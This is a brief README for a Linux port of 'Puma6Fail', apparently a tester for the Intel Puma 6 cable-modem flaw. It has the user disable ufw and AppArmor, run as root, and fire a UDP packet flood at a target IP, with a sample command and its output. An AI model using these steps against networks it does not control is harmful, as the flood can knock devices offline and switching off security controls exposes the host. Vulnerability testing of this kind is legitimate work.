### Puma 6 fail for Linux  
Program for Linux distribution based on Debian and Ubuntu.
- Source: https://github.com/LunNova/Puma6Fail

### Prerequisites
Disable the firewall and AppArmor for testing. This program requires root privileges.

### Usage
- ` chmod +x puma6_fail `
- ` su `
- `chown root:root puma6_fail`
- `ufw disable `
- `systemctl stop apparmor `
- ` ./puma6_fail <target ip=0.0.0.0> <payload length=0> <mbps=1> <ports=50000> <run seconds=-1> `

For example:
- `./puma6_fail 192.168.0.1 0 6 50000 -1 `

 ` Sending 28086.857 UDP pps, 0 bytes payload, 28 bytes IP, 54 bytes ethernet, to 50000 ports at 192.168.0.1 `
  `mbps IP traffic: 6, mbps ethernet traffic: 11.571428 `
 
 ### License
 MIT license.
